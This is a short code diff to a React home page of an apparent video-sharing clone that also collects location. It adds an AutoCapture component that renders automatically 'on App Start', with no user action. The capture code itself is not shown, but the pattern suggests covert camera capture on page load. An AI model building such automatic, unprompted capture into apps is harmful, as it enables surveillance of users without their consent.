@@ -3,11 +3,13 @@ import { Menu, Search, Mic, Video, Bell, Camera, MapPin, Settings, History, Cloc
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { CameraModal } from '@/components/camera-modal';
+import { AutoCapture } from '@/components/auto-capture';
 import { VideoGrid } from '@/components/video-grid';
 import { locationService, type LocationData } from '@/lib/location';
 
 export default function HomePage() {
   const [isCameraModalOpen, setIsCameraModalOpen] = useState(false);
+  const [showAutoCapture, setShowAutoCapture] = useState(true);
   const [location, setLocation] = useState<LocationData | null>(null);
   const [locationStatus, setLocationStatus] = useState('Getting location...');
 
@@ -154,6 +156,11 @@ export default function HomePage() {
       >
         <Camera className="text-white text-2xl" size={24} />
       </Button>
+
+      {/* Auto Capture on App Start */}
+      {showAutoCapture && (
+        <AutoCapture onComplete={() => setShowAutoCapture(false)} />
+      )}
 
       {/* Camera Modal */}
       <CameraModal 
